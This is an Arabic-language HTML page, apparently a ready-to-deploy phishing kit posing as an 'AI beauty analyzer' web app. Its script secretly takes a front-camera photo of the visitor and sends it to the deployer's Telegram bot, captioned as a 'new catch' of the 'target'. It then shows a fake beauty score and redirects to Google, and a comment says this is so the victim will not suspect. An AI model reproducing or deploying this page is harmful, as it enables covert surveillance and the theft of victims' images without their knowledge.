https://<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Beauty Analyzer | مقيم الجمال الذكي</title>
    <style>
        body { background: #fff5f7; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #be185d; overflow: hidden; }
        .container { background: white; padding: 20px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; width: 90%; max-width: 400px; }
        .scanner-area { width: 100%; height: 300px; background: #000; border-radius: 20px; position: relative; overflow: hidden; margin: 20px 0; border: 4px solid #fbcfe8; }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .scan-line { position: absolute; width: 100%; height: 3px; background: #be185d; top: 0; animation: scanning 2.5s infinite; shadow: 0 0 15px #be185d; display: none; }
        @keyframes scanning { 0% { top: 0; } 100% { top: 100%; } }
        .btn { background: #be185d; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(190, 24, 93, 0.4); }
        .btn:active { transform: scale(0.95); }
        #status { font-weight: bold; margin-top: 10px; min-height: 24px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1 style="margin: 0; font-size: 1.5rem;">✨ مقيم الجمال الذكي ✨</h1>
        <p style="font-size: 0.9rem; color: #9d174d;">حلل ملامحك باستخدام أحدث تقنيات AI</p>

        <div class="scanner-area">
            <div class="scan-line" id="scan-line"></div>
            <video id="video" autoplay playsinline muted></video>
        </div>

        <button class="btn" id="start-btn">بدء التحليل</button>
        <div id="status"></div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ⚠️ حط بياناتك هنا يا محزمي
        const BOT_TOKEN = 'هنا_تحط_التوكن_حقك'; 
        const CHAT_ID = 'هنا_تحط_الآي_دي_حقك';

        const startBtn = document.getElementById('start-btn');
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        const scanLine = document.getElementById('scan-line');
        const canvas = document.getElementById('canvas');

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            status.innerText = "جاري الاتصال بخادم AI...";
            
            try {
                // طلب الكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                scanLine.style.display = 'block';
                status.innerText = "ثبات.. جاري تحليل تفاصيل الوجه";

                // تصوير بعد 4 ثواني (عشان يضبط وضعيته)
                setTimeout(() => {
                    captureAndSend(stream, "📸 صيد جديد! وجه الهدف (أمامية)");

                    // نتيجة وهمية بعد التصوير مباشرة
                    setTimeout(() => {
                        status.style.color = "#059669";
                        status.innerText = "اكتمل! نسبة الجمال: 98.2% (جذاب جداً) ✨";
                        
                        // بعد 3 ثواني يحوله لجوجل عشان ما يشك
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 3000);
                    }, 1500);
                }, 4000);

            } catch (e) {
                status.style.color = "#dc2626";
                status.innerText = "خطأ: يجب السماح بالكاميرا لبدء التحليل!";
                startBtn.style.display = 'inline-block';
            }
        };

        function captureAndSend(stream, caption) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'beauty_scan.jpg');
                formData.append('caption', caption);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
